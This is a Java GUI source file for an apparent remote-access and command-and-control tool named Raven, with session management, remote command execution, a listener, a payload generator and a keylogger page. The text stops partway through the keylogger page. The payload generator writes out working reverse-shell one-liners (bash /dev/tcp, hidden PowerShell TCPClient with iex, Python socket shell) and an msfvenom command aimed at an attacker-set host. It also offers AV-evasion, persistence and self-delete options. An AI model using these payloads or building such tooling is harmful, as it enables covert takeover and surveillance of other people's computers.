package com.raven.interfaces.GUI.module.UI.frame;

import com.raven.interfaces.GUI.module.UI.color.Palette;
import com.raven.interfaces.GUI.module.UI.component.ComponentFactory;
import com.raven.interfaces.GUI.module.core.server.CommandDispatcher;
import com.raven.interfaces.GUI.module.core.session.SessionRow;
import com.raven.utils.ServerConfig;
import javafx.collections.ObservableList;
import javafx.collections.transformation.FilteredList;
import javafx.geometry.Insets;
import javafx.geometry.Orientation;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.layout.*;

import java.util.function.Consumer;

public final class PageBuilder {

    private static final String IconDevices   = "\uE32B";
    private static final String IconWifi      = "\uE63E";
    private static final String IconCircle    = "\uEF4A";
    private static final String IconTerminal  = "\uEB8E";
    private static final String IconRefresh   = "\uE5D5";
    private static final String IconPlay      = "\uE037";
    private static final String IconBroadcast = "\uE0C9";
    private static final String IconDelete    = "\uE872";
    private static final String IconClear     = "\uE14C";
    private static final String IconSend      = "\uE163";
    private static final String IconCode      = "\uE86F";
    private static final String IconList      = "\uE896";
    private static final String IconExport    = "\uE2C4";
    private static final String IconDns       = "\uE875";
    private static final String IconShield    = "\uE9E0";
    private static final String IconCheck     = "\uE5CA";
    private static final String IconWarning   = "\uE002";
    private static final String IconKey       = "\uE886";
    private static final String IconInfo      = "\uE8FD";
    private static final String IconBug       = "\uE868";
    private static final String IconFolder    = "\uE2C7";
    private static final String IconNet       = "\uE80C";
    private static final String IconTask      = "\uE8F9";
    private static final String IconTimer     = "\uE425";
    private static final String IconCopy      = "\uE14D";
    private static final String IconDownload  = "\uE2C0";

    private PageBuilder() {}

    public static VBox Overview() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");

        GridPane StatGrid = new GridPane();
        StatGrid.setHgap(8);
        StatGrid.setVgap(8);
        StatGrid.setPadding(new Insets(12));
        for (int I = 0; I < 4; I++) {
            ColumnConstraints Col = new ColumnConstraints();
            Col.setPercentWidth(25);
            Col.setHgrow(Priority.ALWAYS);
            StatGrid.getColumnConstraints().add(Col);
        }
        StatGrid.add(ComponentFactory.StatCard("Sessions",      "0", Palette.AccentBlue,   IconDevices,  "+0", true), 0, 0);
        StatGrid.add(ComponentFactory.StatCard("Raven Agents",  "0", Palette.AccentGreen,  IconWifi,     "+0", true), 1, 0);
        StatGrid.add(ComponentFactory.StatCard("Meterpreter",   "0", Palette.AccentPurple, IconCircle,   "+0", true), 2, 0);
        StatGrid.add(ComponentFactory.StatCard("Reverse Shell", "0", Palette.AccentPink,   IconTerminal, "+0", true), 3, 0);
        Page.getChildren().add(StatGrid);

        ScrollPane ScrollWrapper = new ScrollPane();
        ScrollWrapper.setFitToWidth(true);
        ScrollWrapper.setStyle("-fx-background-color:" + Palette.Background + ";");
        VBox.setVgrow(ScrollWrapper, Priority.ALWAYS);

        VBox Inner = new VBox(10);
        Inner.setPadding(new Insets(0, 12, 12, 12));
        Inner.setStyle("-fx-background-color:" + Palette.Background + ";");

        HBox TwoCol = new HBox(10);
        TwoCol.setFillHeight(true);

        VBox ActivityCard = ComponentFactory.PanelCardWithAccent("Recent Activity", IconList, Palette.AccentBlue);
        VBox ActivityBody = ComponentFactory.GetPanelBody(ActivityCard);
        ActivityBody.setPadding(new Insets(0));
        ActivityBody.getChildren().addAll(
            ComponentFactory.ActivityRow(IconCheck,   Palette.AccentGreen,  "Server initialized and ready",      "just now"),
            ComponentFactory.ActivityRow(IconShield,  Palette.AccentBlue,   "Authentication module loaded",      "just now"),
            ComponentFactory.ActivityRow(IconWarning, Palette.AccentOrange, "Awaiting first session connection", "idle")
        );
        HBox.setHgrow(ActivityCard, Priority.ALWAYS);

        VBox InfoCard = ComponentFactory.PanelCard("Tool Information", IconDns, Palette.AccentTeal);
        InfoCard.setPrefWidth(300);
        VBox InfoBody = ComponentFactory.GetPanelBody(InfoCard);
        InfoBody.setPadding(new Insets(0));
        TextArea InfoText = new TextArea(
            " Author  : MatrixTM26\n Version : 3.0\n\n" +
            " Sessions  — Execute, Broadcast, Kill, filter\n" +
            " Terminal  — Interactive agent shell per session\n" +
            " Commands  — CLI-aligned server/session utilities\n\n" +
            " sessions | status | stats | tasks | kill <id>\n" +
            " sysinfo <id> | whoami <id> | exec <id> <cmd>\n" +
            " broadcast <cmd> | screenshot <id> | download\n" +
            " upload | sleep <id> <sec> | note <id> <text>"
        );
        InfoText.setEditable(false);
        InfoText.setPrefHeight(200);
        StyleHelper.ApplyTerminal(InfoText);
        InfoBody.getChildren().add(InfoText);

        TwoCol.getChildren().addAll(ActivityCard, InfoCard);
        Inner.getChildren().add(TwoCol);
        ScrollWrapper.setContent(Inner);
        Page.getChildren().add(ScrollWrapper);
        return Page;
    }

    public static VBox Sessions(ObservableList<SessionRow> SessionRows,
                                Runnable OnRefresh,
                                Runnable OnExecute,
                                Runnable OnBroadcast,
                                Runnable OnKill,
                                CommandDispatcher[] DispatcherRef,
                                TableView<SessionRow>[] TableRef,
                                TextArea[] LogRef,
                                Consumer<Integer> OnSelectionChanged) {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");

        HBox Toolbar = new HBox(6);
        Toolbar.getStyleClass().add("toolbar-bar");
        Toolbar.setAlignment(Pos.CENTER_LEFT);

        TextField SearchField = new TextField();
        SearchField.setPromptText("Filter sessions...");
        SearchField.getStyleClass().add("search-field");
        SearchField.setPrefWidth(220);

        Button RefreshBtn   = ComponentFactory.ActionButton(IconRefresh   + " Refresh",   "btn", "btn-default");
        Button ExecuteBtn   = ComponentFactory.ActionButton(IconPlay      + " Execute",   "btn", "btn-accent");
        Button BroadcastBtn = ComponentFactory.ActionButton(IconBroadcast + " Broadcast", "btn", "btn-default");
        Button KillBtn      = ComponentFactory.ActionButton(IconDelete    + " Kill",      "btn", "btn-danger");

        RefreshBtn.setOnAction(e -> OnRefresh.run());
        ExecuteBtn.setOnAction(e -> OnExecute.run());
        BroadcastBtn.setOnAction(e -> OnBroadcast.run());
        KillBtn.setOnAction(e -> OnKill.run());

        Toolbar.getChildren().addAll(SearchField, ComponentFactory.FlexSpacer(true),
            RefreshBtn, ExecuteBtn, BroadcastBtn, KillBtn);
        Page.getChildren().add(Toolbar);

        HBox CmdBar = new HBox(6);
        CmdBar.getStyleClass().add("cmd-bar");
        CmdBar.setAlignment(Pos.CENTER_LEFT);
        Label CmdPrompt = new Label("❯");
        CmdPrompt.getStyleClass().add("cmd-prompt");
        TextField CmdField = new TextField();
        CmdField.setPromptText("sessions | status | kill <id> | exec <id> <cmd> | sysinfo <id> | broadcast <cmd>");
        CmdField.getStyleClass().add("input-field");
        HBox.setHgrow(CmdField, Priority.ALWAYS);
        Button RunBtn = ComponentFactory.ActionButton("Run", "btn", "btn-accent");
        RunBtn.setOnAction(e -> { if (DispatcherRef[0] != null) DispatcherRef[0].Dispatch(CmdField.getText().trim(), CmdField); });
        CmdField.setOnAction(e -> { if (DispatcherRef[0] != null) DispatcherRef[0].Dispatch(CmdField.getText().trim(), CmdField); });
        CmdBar.getChildren().addAll(CmdPrompt, CmdField, RunBtn);
        Page.getChildren().add(CmdBar);

        SplitPane Split = new SplitPane();
        Split.setOrientation(Orientation.VERTICAL);
        Split.setDividerPositions(0.65);
        VBox.setVgrow(Split, Priority.ALWAYS);

        TableView<SessionRow> Table = new TableView<>();
        Table.getStyleClass().add("session-table");
        FilteredList<SessionRow> Filtered = new FilteredList<>(SessionRows, R -> true);
        SearchField.textProperty().addListener((Obs, Old, Nv) ->
            Filtered.setPredicate(R ->
                Nv == null || Nv.isBlank()
                    || R.getName().toLowerCase().contains(Nv.toLowerCase())
                    || R.getIp().contains(Nv)
                    || R.getUser().toLowerCase().contains(Nv.toLowerCase())
                    || R.getHost().toLowerCase().contains(Nv.toLowerCase())
            )
        );
        Table.setItems(Filtered);
        String[] Headers    = {"ID", "Type", "Name / Cert", "IP", "OS", "User", "Host", "Session Key"};
        String[] Properties = {"id", "type", "name",        "ip", "os", "user", "host", "joined"};
        for (int I = 0; I < Headers.length; I++) {
            TableColumn<SessionRow, String> Col = new TableColumn<>(Headers[I]);
            Col.setCellValueFactory(new PropertyValueFactory<>(Properties[I]));
            Table.getColumns().add(Col);
        }
        Table.getSelectionModel().selectedItemProperty().addListener((Obs, Old, NewRow) -> {
            if (NewRow != null) OnSelectionChanged.accept(Integer.parseInt(NewRow.getId()));
        });
        Table.setPlaceholder(ComponentFactory.PlaceholderLabel("No active sessions"));
        Table.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
        if (TableRef != null && TableRef.length > 0) TableRef[0] = Table;

        VBox LogPanel = new VBox(0);
        LogPanel.setStyle("-fx-background-color:" + Palette.TerminalBackground + ";");
        HBox LogHeader = new HBox(7);
        LogHeader.setAlignment(Pos.CENTER_LEFT);
        LogHeader.setPadding(new Insets(5, 10, 5, 10));
        LogHeader.setStyle(
            "-fx-background-color:" + Palette.BackgroundDeep + ";" +
            "-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent;" +
            "-fx-border-width:0 0 1 0;"
        );
        TextArea LogArea = new TextArea();
        LogArea.setEditable(false);
        StyleHelper.ApplyTerminal(LogArea);
        VBox.setVgrow(LogArea, Priority.ALWAYS);
        if (LogRef != null && LogRef.length > 0) LogRef[0] = LogArea;
        LogHeader.getChildren().addAll(
            ComponentFactory.MaterialIcon(IconList, Palette.TextTertiary, 11),
            ComponentFactory.SmallCapsLabel("Output", Palette.TextTertiary),
            ComponentFactory.FlexSpacer(true),
            ComponentFactory.IconButton(IconClear, "Clear", e -> LogArea.clear())
        );
        LogPanel.getChildren().addAll(LogHeader, LogArea);
        Split.getItems().addAll(Table, LogPanel);
        Page.getChildren().add(Split);
        return Page;
    }

    public static VBox Terminal(TextField[] SessionIdRef,
                                TextArea[]  TerminalOutputRef,
                                TextField[] CommandFieldRef,
                                Runnable    OnSendCommand,
                                Label[]     SelectedLabelRef) {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.TerminalBackground + ";");

        HBox TermBar = new HBox(9);
        TermBar.setAlignment(Pos.CENTER_LEFT);
        TermBar.setPadding(new Insets(7, 12, 7, 12));
        TermBar.setStyle(
            "-fx-background-color:" + Palette.BackgroundDeep + ";" +
            "-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent;" +
            "-fx-border-width:0 0 1 0;"
        );

        TextField SessionIdField = new TextField();
        SessionIdField.setPrefWidth(76);
        SessionIdField.getStyleClass().add("input-field");
        SessionIdField.setPromptText("Session ID");
        if (SessionIdRef != null && SessionIdRef.length > 0) SessionIdRef[0] = SessionIdField;

        Label SelectedLabel = new Label("No session selected");
        SelectedLabel.setStyle("-fx-font-size:11px; -fx-text-fill:" + Palette.TextTertiary + ";");
        HBox.setHgrow(SelectedLabel, Priority.ALWAYS);
        if (SelectedLabelRef != null && SelectedLabelRef.length > 0) SelectedLabelRef[0] = SelectedLabel;

        TextArea TermOutput = new TextArea();
        TermOutput.setEditable(false);
        StyleHelper.ApplyTerminal(TermOutput);
        VBox.setVgrow(TermOutput, Priority.ALWAYS);
        if (TerminalOutputRef != null && TerminalOutputRef.length > 0) TerminalOutputRef[0] = TermOutput;

        TermBar.getChildren().addAll(
            ComponentFactory.SmallCapsLabel("Session", Palette.TextTertiary),
            SessionIdField,
            StyleHelper.VerticalDivider(),
            SelectedLabel,
            ComponentFactory.IconButton(IconClear, "Clear", e -> TermOutput.clear())
        );
        Page.getChildren().addAll(TermBar, TermOutput);

        HBox InputRow = new HBox(7);
        InputRow.getStyleClass().add("input-bar");
        InputRow.setAlignment(Pos.CENTER_LEFT);
        Label Prompt = new Label("❯");
        Prompt.getStyleClass().add("cmd-prompt");
        TextField CmdField = new TextField();
        CmdField.setPromptText("Enter command...");
        CmdField.getStyleClass().add("input-field");
        HBox.setHgrow(CmdField, Priority.ALWAYS);
        if (CommandFieldRef != null && CommandFieldRef.length > 0) CommandFieldRef[0] = CmdField;
        Button SendBtn = ComponentFactory.ActionButton(IconSend + " Send", "btn", "btn-accent");
        SendBtn.setOnAction(e -> OnSendCommand.run());
        CmdField.setOnAction(e -> OnSendCommand.run());
        InputRow.getChildren().addAll(Prompt, CmdField, SendBtn);
        Page.getChildren().add(InputRow);
        return Page;
    }

    public static VBox CommandCenter(CommandDispatcher[] DispatcherRef, TextArea[] OutputRef) {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");

        VBox RefBar = new VBox(0);
        RefBar.setStyle(
            "-fx-background-color:" + Palette.BackgroundDeep + ";" +
            "-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent;" +
            "-fx-border-width:0 0 1 0;"
        );
        HBox RefHeader = new HBox(7);
        RefHeader.setAlignment(Pos.CENTER_LEFT);
        RefHeader.setPadding(new Insets(6, 12, 6, 12));
        RefHeader.setStyle("-fx-background-color:" + Palette.BackgroundVoid + ";");
        RefHeader.getChildren().addAll(
            ComponentFactory.MaterialIcon(IconCode, Palette.TextTertiary, 11),
            ComponentFactory.SmallCapsLabel("Command Reference", Palette.TextTertiary)
        );
        TextArea RefText = new TextArea(
            "sessions | status | stats | tasks\n" +
            "kill <id>  |  exec <id> <cmd>  |  sysinfo <id>  |  whoami <id>\n" +
            "broadcast <cmd>  |  sleep <id> <sec>  |  screenshot <id>\n" +
            "download <id> <remote>  |  upload <id> <local> <remote>\n" +
            "note <id> <text>  |  getnote <id>  |  history [id] [limit]"
        );
        RefText.setEditable(false);
        RefText.setPrefHeight(86);
        StyleHelper.ApplyTerminal(RefText);
        RefBar.getChildren().addAll(RefHeader, RefText);
        Page.getChildren().add(RefBar);

        HBox CmdBar = new HBox(7);
        CmdBar.getStyleClass().add("cmd-bar");
        CmdBar.setAlignment(Pos.CENTER_LEFT);
        Label Prompt = new Label("❯");
        Prompt.getStyleClass().add("cmd-prompt");
        TextField CmdField = new TextField();
        CmdField.setPromptText("Type command...");
        CmdField.getStyleClass().add("input-field");
        HBox.setHgrow(CmdField, Priority.ALWAYS);
        Button ExecBtn  = ComponentFactory.ActionButton(IconPlay  + " Execute", "btn", "btn-accent");
        Button ClearBtn = ComponentFactory.ActionButton(IconClear + " Clear",   "btn", "btn-default");

        TextArea OutputArea = new TextArea();
        OutputArea.setEditable(false);
        StyleHelper.ApplyTerminal(OutputArea);
        VBox.setVgrow(OutputArea, Priority.ALWAYS);
        if (OutputRef != null && OutputRef.length > 0) OutputRef[0] = OutputArea;

        ExecBtn.setOnAction(e -> { if (DispatcherRef[0] != null) DispatcherRef[0].Dispatch(CmdField.getText().trim(), CmdField); });
        CmdField.setOnAction(e -> { if (DispatcherRef[0] != null) DispatcherRef[0].Dispatch(CmdField.getText().trim(), CmdField); });
        ClearBtn.setOnAction(e -> OutputArea.clear());
        CmdBar.getChildren().addAll(Prompt, CmdField, ExecBtn, ClearBtn);
        Page.getChildren().addAll(CmdBar, OutputArea);
        return Page;
    }

    public static VBox Logs(TextArea[] LogOutputRef) {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.TerminalBackground + ";");

        HBox LogToolbar = new HBox(7);
        LogToolbar.setAlignment(Pos.CENTER_LEFT);
        LogToolbar.setPadding(new Insets(5, 10, 5, 10));
        LogToolbar.setStyle(
            "-fx-background-color:" + Palette.BackgroundDeep + ";" +
            "-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent;" +
            "-fx-border-width:0 0 1 0;"
        );

        HBox LogTitleGroup = new HBox(7);
        LogTitleGroup.setAlignment(Pos.CENTER_LEFT);
        LogTitleGroup.getChildren().addAll(
            ComponentFactory.MaterialIcon(IconList, Palette.TextTertiary, 11),
            ComponentFactory.SmallCapsLabel("Activity Log", Palette.TextTertiary)
        );
        HBox.setHgrow(LogTitleGroup, Priority.ALWAYS);

        TextArea LogArea = new TextArea();
        LogArea.setEditable(false);
        StyleHelper.ApplyTerminal(LogArea);
        VBox.setVgrow(LogArea, Priority.ALWAYS);
        if (LogOutputRef != null && LogOutputRef.length > 0) LogOutputRef[0] = LogArea;

        Button ExportBtn = ComponentFactory.ActionButton(IconExport + " Export", "btn", "btn-default");
        Button ClearBtn  = ComponentFactory.ActionButton(IconClear  + " Clear",  "btn", "btn-danger");
        ClearBtn.setOnAction(e -> LogArea.clear());
        LogToolbar.getChildren().addAll(LogTitleGroup, ExportBtn, ClearBtn);
        Page.getChildren().addAll(LogToolbar, LogArea);
        return Page;
    }

    public static ScrollPane Settings(ServerConfig Config,
                                      ToggleButton[] ServerToggleRef,
                                      TextField[]    HostFieldRef,
                                      TextField[]    PortFieldRef,
                                      Label[]        ServerStatusLabelRef,
                                      Label[]        ServerInfoLabelRef,
                                      Label[]        ToggleStatusLabelRef,
                                      Runnable       OnServerToggleOn,
                                      Runnable       OnServerToggleOff) {
        VBox Content = new VBox(12);
        Content.setPadding(new Insets(14));
        Content.setStyle("-fx-background-color:" + Palette.Background + ";");

        VBox ToggleCard = new VBox(12);
        ToggleCard.getStyleClass().add("server-toggle-card");

        HBox ToggleRow = new HBox(12);
        ToggleRow.setAlignment(Pos.CENTER_LEFT);

        VBox ToggleInfo = new VBox(3);
        Label ToggleTitle = new Label("Listener");
        ToggleTitle.setStyle("-fx-font-size:13px; -fx-font-weight:bold; -fx-text-fill:" + Palette.TextPrimary + ";");
        Label ToggleStatus = new Label("Server is offline");
        ToggleStatus.setStyle("-fx-font-size:11px; -fx-text-fill:" + Palette.TextTertiary + ";");
        ToggleInfo.getChildren().addAll(ToggleTitle, ToggleStatus);
        HBox.setHgrow(ToggleInfo, Priority.ALWAYS);
        if (ToggleStatusLabelRef != null && ToggleStatusLabelRef.length > 0) ToggleStatusLabelRef[0] = ToggleStatus;

        ComponentFactory.ToggleSwitch ListenerToggle = ComponentFactory.BuildToggleSwitch();

        ToggleButton ServerToggle = new ToggleButton("OFF");
        ServerToggle.getStyleClass().addAll("btn", "toggle-btn");
        ServerToggle.setOnAction(e -> {
            if (ServerToggle.isSelected()) {
                ServerToggle.setText("ON");
                OnServerToggleOn.run();
            } else {
                ServerToggle.setText("OFF");
                OnServerToggleOff.run();
            }
        });
        ListenerToggle.SwitchedOnProperty().addListener((Obs, Old, IsOn) -> {
            ServerToggle.setSelected(IsOn);
            ServerToggle.setText(IsOn ? "ON" : "OFF");
            if (IsOn) OnServerToggleOn.run();
            else OnServerToggleOff.run();
        });
        if (ServerToggleRef != null && ServerToggleRef.length > 0) ServerToggleRef[0] = ServerToggle;

        ToggleRow.getChildren().addAll(ToggleInfo, ListenerToggle, ServerToggle);
        ToggleCard.getChildren().add(ToggleRow);
        ToggleCard.getChildren().add(StyleHelper.HorizontalDivider());

        GridPane ConnFields = new GridPane();
        ConnFields.setHgap(10);
        ConnFields.setVgap(8);
        ColumnConstraints LblCol = new ColumnConstraints();
        LblCol.setMinWidth(46);
        LblCol.setMaxWidth(56);
        ColumnConstraints InpCol = new ColumnConstraints();
        InpCol.setHgrow(Priority.ALWAYS);
        ConnFields.getColumnConstraints().addAll(LblCol, InpCol);

        TextField HostField = new TextField(Config.GetServerHost());
        TextField PortField = new TextField(String.valueOf(Config.GetServerPort()));
        HostField.getStyleClass().add("input-field");
        PortField.getStyleClass().add("input-field");
        if (HostFieldRef != null && HostFieldRef.length > 0) HostFieldRef[0] = HostField;
        if (PortFieldRef != null && PortFieldRef.length > 0) PortFieldRef[0] = PortField;

        ConnFields.add(ComponentFactory.MutedLabel("Host"), 0, 0);
        ConnFields.add(HostField, 1, 0);
        ConnFields.add(ComponentFactory.MutedLabel("Port"), 0, 1);
        ConnFields.add(PortField, 1, 1);
        ToggleCard.getChildren().add(ConnFields);
        Content.getChildren().add(ToggleCard);

        VBox StatusCard = ComponentFactory.PanelCard("Server Status", IconDns, Palette.AccentTeal);
        VBox StatusBody = ComponentFactory.GetPanelBody(StatusCard);

        Label ServerStatusLabel = new Label("Offline");
        ServerStatusLabel.setStyle("-fx-text-fill:" + Palette.AccentOrange + "; -fx-font-size:12px; -fx-font-weight:bold;");
        Label ServerInfoLabel = new Label("Not running");
        ServerInfoLabel.setStyle("-fx-font-size:11px; -fx-text-fill:" + Palette.TextTertiary + ";");
        if (ServerStatusLabelRef != null && ServerStatusLabelRef.length > 0) ServerStatusLabelRef[0] = ServerStatusLabel;
        if (ServerInfoLabelRef   != null && ServerInfoLabelRef.length   > 0) ServerInfoLabelRef[0]   = ServerInfoLabel;

        StatusBody.getChildren().addAll(
            ComponentFactory.RowEntry("Status",  ServerStatusLabel),
            ComponentFactory.RowEntry("Address", ServerInfoLabel),
            ComponentFactory.RowEntry("Mode",    ComponentFactory.SmallCapsLabel(Config.GetServerMode(), Palette.AccentBlue))
        );
        Content.getChildren().add(StatusCard);

        VBox NotifCard = ComponentFactory.PanelCard("Notification Settings", IconList, Palette.TextTertiary);
        VBox NotifBody = ComponentFactory.GetPanelBody(NotifCard);
        NotifBody.getChildren().addAll(
            BuildSettingRow("New session alert",   ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Session drop alert",  ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Transfer complete",   ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Sound alerts",        ComponentFactory.BuildToggleSwitch())
        );
        Content.getChildren().add(NotifCard);

        VBox SecCard = ComponentFactory.PanelCard("Security Settings", IconShield, Palette.AccentTeal);
        VBox SecBody = ComponentFactory.GetPanelBody(SecCard);
        ComponentFactory.ToggleSwitch EncToggle = ComponentFactory.BuildToggleSwitch();
        EncToggle.SetSwitchedOn(true);
        ComponentFactory.ToggleSwitch AuthToggle = ComponentFactory.BuildToggleSwitch();
        AuthToggle.SetSwitchedOn(true);
        SecBody.getChildren().addAll(
            BuildSettingRow("Encrypt comms",   EncToggle),
            BuildSettingRow("TLS verify certs", ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Auth required",   AuthToggle),
            BuildSettingRow("OPSEC mode",      ComponentFactory.BuildToggleSwitch())
        );
        Content.getChildren().add(SecCard);

        ScrollPane Scroll = new ScrollPane(Content);
        Scroll.setFitToWidth(true);
        Scroll.setStyle("-fx-background-color:" + Palette.Background + ";");
        return Scroll;
    }

    public static VBox PayloadGen() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");

        HBox Header = BuildPageHeader("Payload Generator", IconBug, Palette.AccentOrange);
        Page.getChildren().add(Header);

        ScrollPane Scroll = new ScrollPane();
        Scroll.setFitToWidth(true);
        Scroll.setStyle("-fx-background-color:" + Palette.Background + ";");
        VBox.setVgrow(Scroll, Priority.ALWAYS);

        HBox TwoCol = new HBox(10);
        TwoCol.setPadding(new Insets(12));

        VBox ConfigCard = ComponentFactory.PanelCard("Configuration", IconBug, Palette.AccentOrange);
        VBox ConfigBody = ComponentFactory.GetPanelBody(ConfigCard);
        HBox.setHgrow(ConfigCard, Priority.ALWAYS);

        GridPane ConfigGrid = new GridPane();
        ConfigGrid.setHgap(8);
        ConfigGrid.setVgap(7);
        ColumnConstraints LblCol = new ColumnConstraints();
        LblCol.setMinWidth(70);
        ColumnConstraints InpCol = new ColumnConstraints();
        InpCol.setHgrow(Priority.ALWAYS);
        ConfigGrid.getColumnConstraints().addAll(LblCol, InpCol);

        TextField LhostField = new TextField("192.168.1.1");
        TextField LportField = new TextField("4444");
        LhostField.getStyleClass().add("input-field");
        LportField.getStyleClass().add("input-field");

        ComboBox<String> PlatCombo = new ComboBox<>();
        PlatCombo.getItems().addAll("Windows", "Linux", "macOS", "Android");
        PlatCombo.setValue("Windows");
        StyleHelper.ApplyCombo(PlatCombo);
        PlatCombo.setMaxWidth(Double.MAX_VALUE);

        ComboBox<String> TypeCombo = new ComboBox<>();
        TypeCombo.getItems().addAll("Raven agent", "Reverse shell", "Meterpreter", "Bind shell");
        TypeCombo.setValue("Raven agent");
        StyleHelper.ApplyCombo(TypeCombo);
        TypeCombo.setMaxWidth(Double.MAX_VALUE);

        ComboBox<String> FmtCombo = new ComboBox<>();
        FmtCombo.getItems().addAll("exe", "elf", "py", "sh", "ps1", "c", "raw");
        FmtCombo.setValue("exe");
        StyleHelper.ApplyCombo(FmtCombo);
        FmtCombo.setMaxWidth(Double.MAX_VALUE);

        ComboBox<String> EncCombo = new ComboBox<>();
        EncCombo.getItems().addAll("None", "base64", "xor", "shikata_ga_nai");
        EncCombo.setValue("None");
        StyleHelper.ApplyCombo(EncCombo);
        EncCombo.setMaxWidth(Double.MAX_VALUE);

        ConfigGrid.add(ComponentFactory.MutedLabel("LHOST"), 0, 0);  ConfigGrid.add(LhostField, 1, 0);
        ConfigGrid.add(ComponentFactory.MutedLabel("LPORT"), 0, 1);  ConfigGrid.add(LportField, 1, 1);
        ConfigGrid.add(ComponentFactory.MutedLabel("Platform"), 0, 2); ConfigGrid.add(PlatCombo, 1, 2);
        ConfigGrid.add(ComponentFactory.MutedLabel("Type"), 0, 3);   ConfigGrid.add(TypeCombo, 1, 3);
        ConfigGrid.add(ComponentFactory.MutedLabel("Format"), 0, 4); ConfigGrid.add(FmtCombo, 1, 4);
        ConfigGrid.add(ComponentFactory.MutedLabel("Encoder"), 0, 5); ConfigGrid.add(EncCombo, 1, 5);

        VBox ToggleGroup = new VBox(7);
        ToggleGroup.setPadding(new Insets(8, 0, 0, 0));
        ToggleGroup.getChildren().addAll(
            BuildSettingRow("Obfuscation",        ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Persistence",         ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("AV evasion",          ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Sandbox detection",   ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Self-delete on exec", ComponentFactory.BuildToggleSwitch())
        );

        TextArea PayloadOut = new TextArea();
        PayloadOut.setEditable(false);
        PayloadOut.setPrefHeight(130);
        StyleHelper.ApplyTerminal(PayloadOut);
        PayloadOut.setPromptText("// payload will appear here after generation");

        Button GenBtn = ComponentFactory.ActionButton(IconPlay + " Generate payload", "btn", "btn-accent");
        Button CopyBtn = ComponentFactory.ActionButton(IconCopy + " Copy", "btn", "btn-default");
        Button DlBtn = ComponentFactory.ActionButton(IconDownload + " Download", "btn", "btn-default");

        GenBtn.setOnAction(e -> {
            String Lh = LhostField.getText().trim();
            String Lp = LportField.getText().trim();
            String Pl = PlatCombo.getValue();
            String Ty = TypeCombo.getValue();
            String Fm = FmtCombo.getValue();
            String Pay;
            if ("Reverse shell".equals(Ty) && "Linux".equals(Pl))
                Pay = "bash -c 'bash -i >& /dev/tcp/" + Lh + "/" + Lp + " 0>&1'";
            else if ("Reverse shell".equals(Ty) && "Windows".equals(Pl))
                Pay = "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('" + Lh + "'," + Lp + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)}\"";
            else if ("Raven agent".equals(Ty))
                Pay = "python3 -c \"import socket,subprocess,os\ns=socket.socket()\ns.connect(('" + Lh + "'," + Lp + "))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\"";
            else
                Pay = "msfvenom -p " + Pl.toLowerCase() + "/meterpreter/reverse_tcp LHOST=" + Lh + " LPORT=" + Lp + " -f " + Fm + " -o payload." + Fm;
            PayloadOut.setText(Pay);
        });
        CopyBtn.setOnAction(e -> {
            javafx.scene.input.Clipboard Cb = javafx.scene.input.Clipboard.getSystemClipboard();
            javafx.scene.input.ClipboardContent Cc = new javafx.scene.input.ClipboardContent();
            Cc.putString(PayloadOut.getText());
            Cb.setContent(Cc);
        });

        ConfigBody.getChildren().addAll(ConfigGrid, ToggleGroup,
            StyleHelper.HorizontalDivider(), PayloadOut,
            new HBox(5) {{ getChildren().addAll(GenBtn, CopyBtn, DlBtn); }});

        VBox InfoCard = ComponentFactory.PanelCard("Payload info", IconInfo, Palette.TextTertiary);
        InfoCard.setPrefWidth(260);
        VBox InfoBody = ComponentFactory.GetPanelBody(InfoCard);
        TextArea InfoText = new TextArea(
            "Supported types:\n" +
            "  Raven agent    — Python reverse shell\n" +
            "  Reverse shell  — Bash / PowerShell\n" +
            "  Meterpreter    — msfvenom wrapper\n" +
            "  Bind shell     — Listen on target\n\n" +
            "Options:\n" +
            "  Obfuscation    — String obfuscation\n" +
            "  Persistence    — Registry / cron\n" +
            "  AV evasion     — Basic evasion\n" +
            "  Sandbox detect — Stall in sandbox\n" +
            "  Self-delete    — Wipe after exec\n"
        );
        InfoText.setEditable(false);
        StyleHelper.ApplyTerminal(InfoText);
        InfoBody.getChildren().add(InfoText);

        TwoCol.getChildren().addAll(ConfigCard, InfoCard);
        Scroll.setContent(TwoCol);
        Page.getChildren().add(Scroll);
        return Page;
    }

    public static VBox KeyloggerPage() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");
        Page.getChildren().add(BuildPageHeader("Keylogger", IconKey, Palette.AccentPurple));

        HBox TwoCol = new HBox(10);
        TwoCol.setPadding(new Insets(12));
        VBox.setVgrow(TwoCol, Priority.ALWAYS);

        VBox CaptureCard = ComponentFactory.PanelCard("Capture output", IconKey, Palette.AccentPurple);
        VBox CaptureBody = ComponentFactory.GetPanelBody(CaptureCard);
        CaptureBody.setPadding(new Insets(0));
        HBox.setHgrow(CaptureCard, Priority.ALWAYS);

        HBox CtrlBar = new HBox(6);
        CtrlBar.setPadding(new Insets(6, 10, 6, 10));
